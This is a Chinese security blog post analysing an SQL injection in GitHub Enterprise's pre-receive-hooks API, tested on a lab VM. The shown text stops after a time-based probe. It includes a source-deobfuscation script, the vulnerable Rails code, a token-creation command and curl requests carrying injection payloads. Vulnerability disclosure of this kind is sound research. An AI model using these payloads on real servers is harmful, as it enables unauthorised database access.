<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
    <title>GitHub Enterprise SQL Injection分析 | MottoIN</title>
    <link rel='dns-prefetch' href='//www.mottoin.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="MottoIN &raquo; GitHub Enterprise SQL Injection分析评论Feed" href="http://www.mottoin.com/95350.html/feed" />
<link rel='stylesheet' id='stylesheet-css'  href='http://www.mottoin.com/wp-content/themes/JustNews/css/style.css?ver=2.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpcom-qa-css'  href='http://www.mottoin.com/wp-content/plugins/wpcom-qa/css/style.css?ver=1.0' type='text/css' media='all' />
<style id='wpcom-qa-inline-css' type='text/css'>

        .q-content .topic-tab,.q-content .q-answer .as-user,.q-content .q-answer .as-comment-name{color: #1471CA;}
        .q-content .q-topic-wrap a:hover,.q-content .q-answer .as-action a:hover,.q-content .topic-tab:hover{color:#0D62B3;}
        .q-content .put-top,.q-content .topic-tab.current-tab,.q-content .q-answer .as-submit .btn-submit,.q-content .q-answer .as-comments-submit,.q-content .q-add-header .btn-post,.q-content .q-pagination .current{background-color:#1471CA;}
        .q-content .q-answer .as-submit .btn-submit:hover,.q-content .q-answer .as-comments-submit:hover,.q-content .q-add-header .btn-post:hover,.q-content .topic-tab.current-tab:hover,.q-content .q-pagination a:hover{background-color:#0D62B3;}
        .q-content .q-answer .as-comments-input:focus{border-color: #1471CA;}
        
</style>
<link rel='stylesheet' id='um_minified-css'  href='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/css/um.min.css?ver=10.3.88' type='text/css' media='all' />
<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/jquery.min.js?ver=1.12.4'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.mottoin.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.mottoin.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='WinDbg 漏洞分析调试（一）' href='http://www.mottoin.com/95344.html' />
<link rel='next' title='安全行业从业人员自研开源扫描器合集（2017/01/11更新）' href='http://www.mottoin.com/94492.html' />
<link rel='shortlink' href='http://www.mottoin.com/?p=95350' />
<!--  WPCOM主题相关信息开始 -->
<meta name="applicable-device" content="pc,mobile">
<meta http-equiv="Cache-Control" content="no-transform">
<meta name="keywords" content="GitHub Enterprise,GitHub企业版注入,GitHub注入">
<meta name="description" content="前言GitHubEnterprise是一款由 GitHub.com所出品，可将整个GitHub服务架设在自身企业内网中的应用软体。有兴趣的话你可以从enterprise.github.com下载到多种格式的映像档并从网页上取得45天的试用授权!安装完成后，你应该会看到如下的画面:好!现在我们有整个GitHub的环境了，而且是在VM里面，这代表几乎有完整的控制权可以对他做更进一步的研究，分析环境、程">
<!--  WPCOM主题相关信息结束 -->
 
		<script type="text/javascript">

		var ultimatemember_image_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-image-upload.php';
		var ultimatemember_file_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-file-upload.php';
		var ultimatemember_ajax_url = 'http://www.mottoin.com/wp-admin/admin-ajax.php';

		</script>

	
		<style type="text/css">.request_name { display: none !important; }</style>

	<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-32x32.jpg" sizes="32x32" />
<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-192x192.jpg" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-180x180.jpg" />
<meta name="msapplication-TileImage" content="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-270x270.jpg" />
    <style>
                a,.sec-panel-head span,.list.tabs .tab.active a,.header .nav>li.active>a,.header .dropdown-menu>.active>a,.entry .entry-info .nickname,.entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.comment-body .nickname,.form-submit-text span,.widget_profile .author-title,.um .um-profile-body .um-item-meta a,.login-modal-body .btn-register{color: #08c;}
        .header .dropdown-menu>li>a:hover,.header .dropdown-menu>.active>a:hover,.header .dropdown-menu>.active>a:focus,.navbar-action .publish,.pagination .current,.flex-control-paging li a.flex-active,.form-submit .submit,.sidebar .widget_nav_menu ul li.current-menu-item a,.sidebar .widget_nav_menu ul li.current-post-parent a,.search-form input.submit,.action .contact-title,.pf-submit,.tagHandler ul.tagHandlerContainer li.tagItem,.login-modal-body .btn-login,.woocommerce a.button,.woocommerce button.button,.woocommerce input.button,.woocommerce a.button.alt,.woocommerce button.button.alt,.woocommerce input.button.alt,.woocommerce a.button.alt.disabled,.woocommerce a.button.alt.disabled:hover,.woocommerce a.button.alt:disabled,.woocommerce a.button.alt:disabled:hover,.woocommerce a.button.alt:disabled[disabled],.woocommerce a.button.alt:disabled[disabled]:hover,.woocommerce button.button.alt.disabled,.woocommerce button.button.alt.disabled:hover,.woocommerce button.button.alt:disabled,.woocommerce button.button.alt:disabled:hover,.woocommerce button.button.alt:disabled[disabled],.woocommerce button.button.alt:disabled[disabled]:hover,.woocommerce input.button.alt.disabled,.woocommerce input.button.alt.disabled:hover,.woocommerce input.button.alt:disabled,.woocommerce input.button.alt:disabled:hover,.woocommerce input.button.alt:disabled[disabled],.woocommerce input.button.alt:disabled[disabled]:hover,.woocommerce .widget_price_filter .ui-slider .ui-slider-handle,.woocommerce .widget_price_filter .ui-slider .ui-slider-range,.shopping-count,.social-login-form .sl-input-submit{background-color: #08c;}
        .entry .entry-content h3,.entry .entry-content .h3,.widget-title{border-left-color: #08c;}
        .entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.search-form input.keyword:focus,.widget_profile .author-title,.login-modal-body .btn-login,.login-modal-body .btn-register{border-color: #08c;}
        .entry-bar-inner .author-title:before,.widget_profile .author-title:before{border-right-color: #08c;}
        .list.tabs .tab.active a{border-bottom-color: #08c;}

        a:hover,.header .nav>li>a:hover,.header .nav>li.active>a,.navbar-action .login:hover,.navbar-action .login:focus,.navbar-action .profile a:hover,.navbar-search-icon:hover,.navbar-search-icon:focus,.entry .entry-info a:hover,.entry .entry-info a:focus,.entry-bar .info-item a:hover,.p-item-wrap:hover .title a,.special-item-title a:hover,.special-item-bottom a:hover,.widget ul a:hover,.widget ol a:hover,.sec-panel-head .more:hover,.topic-list .topic-wrap:hover span,.tabs .tab a:hover,
        .article-list .item-title a:hover,.article-list .item-meta a:hover,.article-list .item-meta a:focus,.list-links a:hover,.list-links a:focus,.um .um-profile-body .um-item-meta a:hover,.um .um-profile-body .um-item-link a:hover,.load-more:hover,.login-modal-body .btn-register:hover{color: #07c;}
        .navbar-action .publish:hover,.navbar-action .publish:focus,.entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.pagination a:hover,.flex-control-paging li a:hover,.form-submit .submit:hover,.widget .tagcloud a:hover,.sidebar .widget_nav_menu ul li.current-menu-item .sub-menu a:hover,.sidebar .widget_nav_menu ul li.current-post-parent .sub-menu a:hover,.sidebar .widget_nav_menu ul li a:hover,.search-form input.submit:hover,.action .a-box:hover,.footer-sns .fa:after,.article-list .item-category:hover,.pf-submit:hover,.tagHandler ul.tagHandlerContainer li.tagItem:hover,.login-modal-body .btn-login:hover,.woocommerce a.button:hover,.woocommerce button.button:hover,.woocommerce input.button:hover,.woocommerce a.button.alt:hover,.woocommerce button.button.alt:hover,.woocommerce input.button.alt:hover,.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content,.social-login-form .sl-input-submit:hover{background-color: #07c;}
        .entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.widget .tagcloud a:hover,.load-more:hover,.login-modal-body .btn-login:hover,.login-modal-body .btn-register:hover{border-color: #07c;}
        .special-item-bottom a:hover:before{border-left-color: #07c;}
        .list.tabs .tab.active a:hover{border-bottom-color: #07c;}
        @media (max-width: 991px){
            .header .navbar-nav>li.active>a,.header .navbar-nav .dropdown-menu .active a,.header .navbar-nav .dropdown-menu .active .dropdown-menu .active a{color: #08c;}
            .navbar-collapse{background-color: #08c;}
            .dropdown-menu>li a{border-color: #07c;}
            .header .navbar-nav>li.active>a:hover,.header .navbar-nav>li a:hover,.header .navbar-nav .dropdown-menu .active a:hover,.header .navbar-nav .dropdown-menu .active .dropdown-menu a:hover,.header .navbar-nav .dropdown-menu li a:hover{color: #07c;}
        }
        .j-share{position: fixed!important;top: 50%!important;}
                .header .logo img{max-height: 32px;}
                @media (max-width: 767px){
            .header .logo img{max-height: 26px;}
        }
                        .btn-post{
    display: block;
    margin: 0 auto;
    padding: 15px 20px;
    font-size: 16px;
    text-align: center;
    color: #fff !important;
    line-height: 1;
    background: #1471CA;
    -webkit-border-radius: 3px;
    border-radius: 3px;
    text-decoration: none;
    border: 0;
    outline: 0;
}    </style>
    <script> (function() {if (!/*@cc_on!@*/0) return;var e = "abbr, article, aside, audio, canvas, datalist, details, dialog, eventsource, figure, footer, header, hgroup, mark, menu, meter, nav, output, progress, section, time, video".split(', ');var i= e.length; while (i--){ document.createElement(e[i]) } })()</script>
    <!--[if lte IE 8]><script src="http://www.mottoin.com/wp-content/themes/JustNews/js/respond.min.js"></script><![endif]-->
</head>
<body class="post-template-default single single-post postid-95350 single-format-standard">
<header class="header">
    <div class="container clearfix">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="icon-bar icon-bar-1"></span>
                <span class="icon-bar icon-bar-2"></span>
                <span class="icon-bar icon-bar-3"></span>
            </button>
            <a class="logo" href="http://www.mottoin.com"><img src="http://www.mottoin.com/img/mottoin/logo.png" alt="MottoIN"></a>
        </div>
        <div class="collapse navbar-collapse">
            <nav class="navbar-left primary-menu"><ul id="menu-%e5%af%bc%e8%88%aa" class="nav navbar-nav"><li class="menu-item menu-item-home"><a href="http://www.mottoin.com/">首页</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/news">资讯</a></li>
<li class="menu-item current-post-ancestor dropdown"><a href="http://www.mottoin.com/category/article" class="dropdown-toggle">文章</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/web">Web安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/system">系统安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/network">网络安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/terminal">终端安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/database">数据安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/wireless">无线安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/social">社会工程</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/intranet">内网渗透</a></li>
	<li class="menu-item current-post-ancestor current-menu-parent current-post-parent"><a href="http://www.mottoin.com/category/article/code">代码审计</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/reverse">逆向破解</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/tools">工具</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/geek">极客</a></li>
<li class="menu-item dropdown"><a href="http://www.mottoin.com/category/sole" class="dropdown-toggle">独家</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/topic">专题</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/people">人物</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/view">观点</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/events">活动</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/video">视频</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/hr">招聘</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/forum">社区</a></li>
</ul></nav>            <div class="navbar-action pull-right">

                                    <form class="navbar-search" action="http://www.mottoin.com" method="get" role="search">
                        <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value="">
                        <a class="navbar-search-icon j-navbar-search" href="javascript:;"></a>
                    </form>

                    
                    <div id="j-user-wrap">
                        <a class="login" href="http://www.mottoin.com/login">登录</a>
                        <a class="login" href="http://www.mottoin.com/register">注册</a>
                    </div>
                    <a class="publish" href="http://www.mottoin.com/post">
                        投稿</a>
                                                </div>
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
</header>
<div id="wrap">    <div class="main container">
        <div class="content">
                            <article id="post-95350" class="post-95350 post type-post status-publish format-standard has-post-thumbnail hentry category-code tag-github-enterprise tag-github">
                    <div class="entry">
                        <div class="entry-head">
                            <h1 class="entry-title">GitHub Enterprise SQL Injection分析</h1>
                            <div class="entry-info">
                                                                <a class="nickname" href="http://www.mottoin.com/user/seceditor/">Moto</a>
                                <span class="dot">•</span>
                                <span>2017年1月11日</span>
                                <span class="dot">•</span>
                                <a href="http://www.mottoin.com/category/article/code" rel="category tag">代码审计</a>                                                                    <span class="dot">•</span>
                                    <span>阅读 1549</span>
                                                            </div>
                        </div>
                                                                        <div class="entry-content clearfix">
                            <h2>前言</h2>
<p>GitHub Enterprise 是一款由 <a href="https://github.com/">GitHub.com</a> 所出品，可将整个 GitHub 服务架设在自身企业内网中的应用软体。 有兴趣的话你可以从 <a href="https://enterprise.github.com/">enterprise.github.com</a> 下载到多种格式的映像档并从网页上取得 45 天的试用授权!</p>
<p>安装完成后，你应该会看到如下的画面:</p>
<p><img class="alignnone size-full wp-image-95351 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/01/2016-12-27_152322.png" alt="2016-12-27_152322" width="825" height="731" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/01/2016-12-27_152322.png 825w, http://www.mottoin.com/wp-content/uploads/2017/01/2016-12-27_152322-300x266.png 300w, http://www.mottoin.com/wp-content/uploads/2017/01/2016-12-27_152322-768x680.png 768w" sizes="(max-width: 825px) 100vw, 825px" /></p>
<p><img class="alignnone size-full wp-image-95352 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/01/2016-12-27_153057.png" alt="2016-12-27_153057" width="1280" height="720" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/01/2016-12-27_153057.png 1280w, http://www.mottoin.com/wp-content/uploads/2017/01/2016-12-27_153057-300x169.png 300w, http://www.mottoin.com/wp-content/uploads/2017/01/2016-12-27_153057-768x432.png 768w, http://www.mottoin.com/wp-content/uploads/2017/01/2016-12-27_153057-1024x576.png 1024w" sizes="(max-width: 1280px) 100vw, 1280px" /></p>
<p>好!现在我们有整个 GitHub 的环境了，而且是在 VM 里面，这代表几乎有完整的控制权可以对他做更进一步的研究，分析环境、程式码以及架构等等&#8230;</p>
<h2>环境</h2>
<p>身为一个骇客，再进行入侵前的第一件事当然是 Port Scanning! 通过Nmap 扫描后发现 VM 上一共有 6 个端口对外开放:</p>
<pre>$ nmap -sT -vv -p 1-65535 192.168.187.145
...
PORT STATE SERVICE 
22/tcp open ssh 
25/tcp closed smtp 
80/tcp open http 
122/tcp open smakynet 
443/tcp open https 
8080/tcp closed http-proxy 
8443/tcp open https-alt 
9418/tcp open git</pre>
<p>这 6 个端口大致的作用是:</p>
<ul>
<li>22/tcp 及 9418/tcp 是 haproxy 协议，并将收到的连线转发到后段的 babeld 服务</li>
<li>80/tcp 及 443/tcp 为 GitHub 主要服务的端口</li>
<li>122/tcp 就是 SSH 服务</li>
<li>8443/tcp GitHub Enterprise 的网页管理介面</li>
</ul>
<p>额外一提的是，GitHub 的网页管理介面需要一组密码以供登入，但如果你有密码的话你可以直接通过管理介面新增自己的 SSH 密钥并登入 122/tcp 上的 SSH 所以 有管理员密码 == 可以远端代码执行 !</p>
<p>使用 SSH 连线进去后，审视一下整个系统发现所有服务的代码皆位于目录 <code>/data/</code> 下，大致目录架构如下:</p>
<pre># ls -al /data/
total 92 
drwxr-xr-x 23 root root 4096 Nov 29 12:54 . 
drwxr-xr-x 27 root root 4096 Dec 28 19:18 .. 
drwxr-xr-x 4 git git 4096 Nov 29 12:54 alambic 
drwxr-xr-x 4 babeld babeld 4096 Nov 29 12:53 babeld 
drwxr-xr-x 4 git git 4096 Nov 29 12:54 codeload 
drwxr-xr-x 2 root root 4096 Nov 29 12:54 db 
drwxr-xr-x 2 root root 4096 Nov 29 12:52 enterprise 
drwxr-xr-x 4 enterprise-manage enterprise-manage 4096 Nov 29 12:53 enterprise-manage 
drwxr-xr-x 4 git git 4096 Nov 29 12:54 failbotd 
drwxr-xr-x 3 root root 4096 Nov 29 12:54 git-hooks 
drwxr-xr-x 4 git git 4096 Nov 29 12:53 github 
drwxr-xr-x 4 git git 4096 Nov 29 12:54 git-import 
drwxr-xr-x 4 git git 4096 Nov 29 12:54 gitmon 
drwxr-xr-x 4 git git 4096 Nov 29 12:54 gpgverify 
drwxr-xr-x 4 git git 4096 Nov 29 12:54 hookshot 
drwxr-xr-x 4 root root 4096 Nov 29 12:54 lariat 
drwxr-xr-x 4 root root 4096 Nov 29 12:54 longpoll 
drwxr-xr-x 4 git git 4096 Nov 29 12:54 mail-replies 
drwxr-xr-x 4 git git 4096 Nov 29 12:54 pages 
drwxr-xr-x 4 root root 4096 Nov 29 12:54 pages-lua 
drwxr-xr-x 4 git git 4096 Nov 29 12:54 render 
lrwxrwxrwx 1 root root 23 Nov 29 12:52 repositories -&gt; /data/user/repositories 
drwxr-xr-x 4 git git 4096 Nov 29 12:54 slumlord 
drwxr-xr-x 20 root root 4096 Dec 28 19:22 user</pre>
<p>接着随便选取一个目录尝试读取源码，发现源码看起来被加密了 🙁 加密后的源码看起来像是:</p>
<p><img class="alignnone size-full wp-image-95353 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/01/2016-12-27_205032.png" alt="2016-12-27_205032" width="905" height="583" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/01/2016-12-27_205032.png 905w, http://www.mottoin.com/wp-content/uploads/2017/01/2016-12-27_205032-300x193.png 300w, http://www.mottoin.com/wp-content/uploads/2017/01/2016-12-27_205032-768x495.png 768w" sizes="(max-width: 905px) 100vw, 905px" /></p>
<p>GitHub 使用客制化的函式库来混淆他们的源码，如果你在 Google 上搜寻客制化函示酷的名称<code>ruby_concealer.so</code> 你会发现已经有个好心人把写好的解密程式放在 这份 <a href="https://gist.github.com/geoff-codes/02d1e45912253e9ac183">gist</a> 上了!</p>
<p>解密程式很简单，只是单纯将函示库中的 <code>rb_f_eval</code> 替换成 <code>rb_f_puts</code> ，所以原本会进行 <code>eval</code> 的动作变成直接将解密后的源码打印出来!</p>
<p>但是身为一个骇客，不能只是 Script Kiddie 伸手党只会使用别人的程式，必须要了解它内部原理是如何实现的!</p>
<p>所以我们来打开 IDA Pro 来分析一下 Binary 吧! ๑•̀ㅂ•́)و</p>
<p><img class="alignnone size-full wp-image-95354 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/01/2017-01-05_184700.png" alt="2017-01-05_184700" width="1348" height="924" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/01/2017-01-05_184700.png 1348w, http://www.mottoin.com/wp-content/uploads/2017/01/2017-01-05_184700-300x206.png 300w, http://www.mottoin.com/wp-content/uploads/2017/01/2017-01-05_184700-768x526.png 768w, http://www.mottoin.com/wp-content/uploads/2017/01/2017-01-05_184700-1024x702.png 1024w, http://www.mottoin.com/wp-content/uploads/2017/01/2017-01-05_184700-220x150.png 220w" sizes="(max-width: 1348px) 100vw, 1348px" /></p>
<p><img class="alignnone size-full wp-image-95355 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/01/2017-01-05_184720.png" alt="2017-01-05_184720" width="1348" height="924" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/01/2017-01-05_184720.png 1348w, http://www.mottoin.com/wp-content/uploads/2017/01/2017-01-05_184720-300x206.png 300w, http://www.mottoin.com/wp-content/uploads/2017/01/2017-01-05_184720-768x526.png 768w, http://www.mottoin.com/wp-content/uploads/2017/01/2017-01-05_184720-1024x702.png 1024w, http://www.mottoin.com/wp-content/uploads/2017/01/2017-01-05_184720-220x150.png 220w" sizes="(max-width: 1348px) 100vw, 1348px" /></p>
<p>从上方的 Hex-Rays 转 C 语言代码可以看到，函示库使用 <code>Zlib::Inflate::inflate</code> 先将源码乱码的资料解压缩，接着再使用 XOR 并用下面的密钥进行解密:</p>
<blockquote><p>This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this &#8216;encryption&#8217; is easily broken.</p></blockquote>
<p>了解原理后其实可以很简单的写个小程式去解密它!</p>
<pre>require 'zlib' 
key = "This obfuscation is intended to discourage GitHub Enterprise customers from making modifications 
to the VM. We know this 'encryption' is easily broken. "

def decrypt(s) 
 i, plaintext = 0, ''

Zlib::Inflate.inflate(s).each_byte do |c|
 plaintext &lt;&lt; (c ^ key[i%key.length].ord).chr
 i += 1
 end
 plaintext
end

content = File.open(ARGV[0], "r").read 
content.sub! %Q(require "ruby_concealer.so"\n__ruby_concealer__), " decrypt " 
plaintext = eval content

puts plaintext</pre>
<h2>代码分析</h2>
<p>在反混淆 GitHub 的代码后，终于可以开始我们的源码审计! 首先，使用 cloc 看一下大致架构组成!</p>
<pre>$ cloc /data/
 81267 text files.
 47503 unique files.
 24550 files ignored.

http://cloc.sourceforge.net v 1.60 T=348.06 s (103.5 files/s, 15548.9 lines/s) 
-----------------------------------------------------------------------------------
Language files blank comment code 
-----------------------------------------------------------------------------------
Ruby 25854 359545 437125 1838503 
Javascript 4351 109994 105296 881416 
YAML 600 1349 3214 289039 
Python 1108 44862 64025 180400 
XML 121 6492 3223 125556 
C 444 30903 23966 123938 
Bourne Shell 852 14490 16417 87477 
HTML 636 24760 2001 82526 
C++ 184 8370 8890 79139 
C/C++ Header 428 11679 22773 72226 
Java 198 6665 14303 45187 
CSS 458 4641 3092 44813 
Bourne Again Shell 142 6196 9006 35106 
m4 21 3259 369 29433 
...</pre>
<p>看一下 Ruby 以及 Rails 的版本</p>
<pre>$ ./bin/rake about
About your application's environment 
Ruby version 2.1.7 (x86_64-linux) 
RubyGems version 2.2.5 
Rack version 1.6.4 
Rails version 3.2.22.4 
JavaScript Runtime Node.js (V8) 
Active Record version 3.2.22.4 
Action Pack version 3.2.22.4 
Action Mailer version 3.2.22.4 
Active Support version 3.2.22.4 
Middleware GitHub::DefaultRoleMiddleware, Rack::Runtime, Rack::MethodOverride, 
ActionDispatch::RequestId, Rails::Rack::Logger, ActionDispatch::ShowExceptions, 
ActionDispatch::DebugExceptions, ActionDispatch::Callbacks, 
ActiveRecord::ConnectionAdapters::ConnectionManagement, ActionDispatch::Cookies, 
ActionDispatch::Session::CookieStore, ActionDispatch::Flash, ActionDispatch::ParamsParser, 
ActionDispatch::Head, Rack::ConditionalGet, Rack::ETag, ActionDispatch::BestStandardsSupport 
Application root /data/github/9fcdcc8 
Environment production 
Database adapter githubmysql2 
Database schema version 20161003225024</pre>
<p>大部分的代码使用 Ruby 撰写，可以看出 GitHub 很喜欢使用 Ruby on Rails 及 Sinatra 等 Ruby 网页框架进行网页开发</p>
<ul>
<li>目录 <code>/data/github/</code> 看起来是跑在 80/tcp 443/tcp 的服务，经过一些指纹分析，看起来这份源码是真的跑在 github.com、 gist.github.com 及 api.github.com 的源码!</li>
<li><code>/data/render/</code> 看起来是跑在 render.githubusercontent.com 的源码</li>
<li><code>/data/enterprise-manage/</code> 是 8443/tcp 管理界面的源码</li>
</ul>
<p>GitHub Enterprise 的源码同时也是 GitHub.com 的源码，但两者实际上运行会有差异吗?</p>
<p>经过一点研究后发现这份代码使用了 enterprise? 及 dotcom? 这两个方法来判断当前是在 Enterprise 模式 或是 GitHub dot com 模式 ，所以有些只有在 Enterprise 才有的功能从 GitHub.com 上会无法访问，不过猜测两者的 Code Base 应该是一样的没错!</p>
<h2>漏洞</h2>
<p>我大约花了一个礼拜的进行代码审计跟发现漏洞，本身并不是很熟 Ruby (Ruby 很魔法，本身是 Python 派XD)，但就是边看边学 相信也有很多人也是这样，先学会 SQL Injection 才学会 SQL，先学会逆向工程组合语言才学会 C 语言的 😛</p>
<p>大致上的流程差不多是:</p>
<ul>
<li>Day 1 &#8211; 设定 VM</li>
<li>Day 2 &#8211; 设定 VM</li>
<li>Day 3 &#8211; 代码审计，顺便学 Rails</li>
<li>Day 4 &#8211; 代码审计，顺便学 Rails</li>
<li>Day 5 &#8211; 代码审计，顺便学 Rails</li>
<li>Day 6 &#8211; 耶，找到漏洞惹!</li>
</ul>
<p>漏洞存在于 <code>PreReceiveHookTarget</code> 这个 <code>model</code> 上!</p>
<p>整个漏洞发生的核心原因在于 <code>/data/github/current/app/model/pre_receive_hook_target.rb</code> 这个档案的第 45 行</p>
<pre>33 scope :sorted_by, -&gt; (order, direction = nil) { 
34 direction = "DESC" == "#{direction}".upcase ? "DESC" : "ASC" 
35 select(&lt;&lt;-SQL) 
36 #{table_name}.*, 
37 CASE hookable_type 
38 WHEN 'global' THEN 0 
39 WHEN 'User' THEN 1 
40 WHEN 'Repository' THEN 2 
41 END AS priority 
42 SQL 
43 .joins("JOIN pre_receive_hooks hook ON hook_id = hook.id") 
44 .readonly(false) 
45 .order([order, direction].join(" ")) 
46 }</pre>
<p>虽然 Rails 使用内建的 ORM(或叫做 ActiveRecord) 来保护开发者免于 SQL Injection 的困扰，但在使用 ActiveRecord 上如果误用了一些函数还是有可能造成 SQL Injection 漏洞的，像是对于 SQL 中 identity 的使用如果直接代入使用者输入，在许多 ORM 上都是会产生 SQL Injection 的，更多的细节你可以参考 <a href="http://rails-sqli.org/">Rails-sqli.org</a> 这个网站，它整理了很多 Rails 中误用的例子!</p>
<p>在 GitHub Enterprise 这个案例中，如果我们可以控制 <code>order</code> 这个参数，就可以注入恶意的 SQL 到服务器中，所以接下来尝试往上追，看那些代码会使用到 <code>sorted_by</code> 这个方法?</p>
<p>往上追后，发现 /data/github/current/app/api/org_pre_receive_hooks.rb 第 61 行:</p>
<pre>10 get "/organizations/:organization_id/pre-receive-hooks" do 
11 control_access :list_org_pre_receive_hooks, :org =&gt; org = find_org! 
12 @documentation_url &lt;&lt; "#list-pre-receive-hooks" 
13 targets = PreReceiveHookTarget.visible_for_hookable(org) 
14 targets = sort(targets).paginate(pagination) 
15 GitHub::PrefillAssociations.for_pre_receive_hook_targets targets 
16 deliver :pre_receive_org_target_hash, targets 
17 end 
...
60 def sort(scope) 
61 scope.sorted_by("hook.#{params[:sort] || "id"}", params[:direction] || "asc") 
62 end</pre>
<p>使用者参数 <code>params[:sort]</code> 直接被代入到 <code>scope.sorted_by</code> 中，所以只要在 <code>/organizations/:organization_id/pre-receive-hooks</code> 这个路由上的 <code>sort</code> 参数上插入恶意的 SQL 就可以产生 SQL Injection!</p>
<p>由于这个漏洞是在 GitHub Enterprise 的 API 功能中，在触发漏洞之前必须先有一组合法的 <code>access_token</code> 并且拥有 <code>admin:pre_receive_hook</code> 的权限才可以。</p>
<p>不过这点对我们来说也不是难事，经过一段时间的代码审计发现可以通过下面的指令来取得相对应的权限:</p>
<pre>$ curl -k -u 'nogg:nogg' 'https://192.168.187.145/api/v3/authorizations' \
-d '{"scopes":"admin:pre_receive_hook","note":"x"}'
{
 "id": 4,
 "url": "https://192.168.187.145/api/v3/authorizations/4",
 "app": {
 "name": "x",
 "url": "https://developer.github.com/enterprise/2.8/v3/oauth_authorizations/",
 "client_id": "00000000000000000000"
 },
 "token": "????????",
 "hashed_token": "1135d1310cbe67ae931ff7ed8a09d7497d4cc008ac730f2f7f7856dc5d6b39f4",
 "token_last_eight": "1fadac36",
 "note": "x",
 "note_url": null,
 "created_at": "2017-01-05T22:17:32Z",
 "updated_at": "2017-01-05T22:17:32Z",
 "scopes": [
 "admin:pre_receive_hook"
 ],
 "fingerprint": null
}</pre>
<p>一但有了 <code>access_token</code> ，接着就可以用以下的指令触发漏洞:</p>
<pre>$ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' \
'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&amp;sort=id,
(select+1+from+information_schema.tables+limit+1,1)' 
[

]

$ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' \

'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&amp;sort=id,
(select+1+from+mysql.user+limit+1,1)' 
{
 "message": "Server Error",
 "documentation_url": "https://developer.github.com/enterprise/2.8/v3/orgs/pre_receive_hooks"
}

$ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' \

'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????
&amp;sort=id,if(user()="github@localhost",sleep(5),user()) 
{
 ...
}</pre>
<p>使用 Time-Based SQL Injection 判断数据库使用者是否为 <code>github@localhost</code></p>
